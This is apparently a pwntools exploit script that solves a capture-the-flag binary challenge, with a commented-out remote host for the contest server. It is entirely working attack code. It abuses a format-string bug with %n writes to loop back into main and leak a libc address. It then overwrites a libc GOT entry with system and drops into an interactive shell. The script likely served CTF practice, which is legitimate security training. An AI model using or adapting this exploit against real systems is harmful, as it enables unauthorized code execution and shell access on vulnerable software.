from pwn import *
import time

context.binary = elf = ELF("./vuln")
libc = ELF("./libc.so.6")

done = False
while not done:
  conn = process()
  # conn = remote("valentine.chal.cubectf.com", 42042)
  conn.sendline(b"???")
  conn.sendline(b"%*13$p%8$n%34$hn" + p64(0x403e00 + (elf.sym.main & 0xffff))[:-1])
  conn.recvuntil(b"0x")
  libc.address = int(conn.recv(12),16) - 0x1f6b03
  to_write = libc.sym.system & 0xffffffff
  info("libc @ " + hex(libc.address))
  info("got @ " + hex(libc.address+0x1f6000))
  info("to write: " + hex(to_write))
  if to_write > 0x10000000 or to_write>>24 == 0xa:
    conn.close()
    continue
  done = True
  info("managable write, continuing")
  conn.recvuntil(b"card for")
  conn.sendline(b"sh")
  conn.sendline(f"`%{(libc.sym.system & 0xffffffff)-2}c%8$n".encode().ljust(16,b"a") + p64(libc.address+0x1f6080)[:-1])
  conn.sendline(b"echo hi")
  conn.recvuntil(b"hi")

  conn.interactive()
